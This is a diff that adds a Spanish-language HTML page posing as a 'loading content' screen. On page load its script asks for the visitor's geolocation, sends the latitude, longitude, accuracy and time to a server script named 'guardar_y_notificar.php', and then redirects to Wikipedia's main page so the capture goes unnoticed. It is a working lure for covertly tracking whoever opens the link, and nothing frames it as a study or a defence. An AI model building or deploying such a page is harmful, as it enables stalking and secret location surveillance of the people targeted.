@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Contenido</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #222; color: #ddd; text-align: center; font-family: sans-serif; padding-top: 40%; }
+        p { font-size: 1.2em; }
+    </style>
+</head>
+<body>
+    <p>Cargando contenido, por favor espera...</p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 10000 });
+            } else {
+                redirigir();
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var precision = position.coords.accuracy;
+            var fecha = new Date().toLocaleString();
+
+            var data = new URLSearchParams();
+            data.append('lat', lat);
+            data.append('lon', lon);
+            data.append('precision', precision);
+            data.append('fecha', fecha);
+
+            fetch('guardar_y_notificar.php', {
+                method: 'POST',
+                body: data
+            }).then(response => response.text())
+              .then(() => {
+                redirigir();
+              })
+              .catch(error => {
+                redirigir();
+              });
+        }
+
+        function showError(error) {
+            redirigir();
+        }
+
+        function redirigir() {
+            window.location.href = "https://en.wikipedia.org/wiki/Main_Page";
+        }
+
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
